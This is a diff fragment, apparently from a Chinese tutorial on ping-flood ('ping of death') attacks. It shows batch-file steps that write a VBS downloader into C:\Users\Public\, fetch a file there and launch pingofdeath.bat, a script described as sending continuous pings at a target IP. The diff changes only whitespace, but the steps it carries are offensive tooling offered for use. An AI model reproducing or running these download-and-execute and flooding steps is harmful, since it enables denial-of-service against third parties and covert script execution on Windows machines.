@@ -55,12 +55,14 @@ ping 数据包也可以通过向目标 IP 地址发送连续的 ping 数据包�
 
     ::设置文件保存目录，若下载至当前目录，请留空
     set Save=C:\Users\Public\
-更改DownloadFile.vbs文件指定路径。
+
+更改DownloadFile.vbs文件指定路径。  
 
     ::原代码
     echo End Sub)>DownloadFile.vbs
     ::修改为
     echo End Sub)>C:\Users\Public\DownloadFile.vbs
+
 最后，我们启动下载的文件。  
 
     start C:\Users\Public\pingofdeath.bat
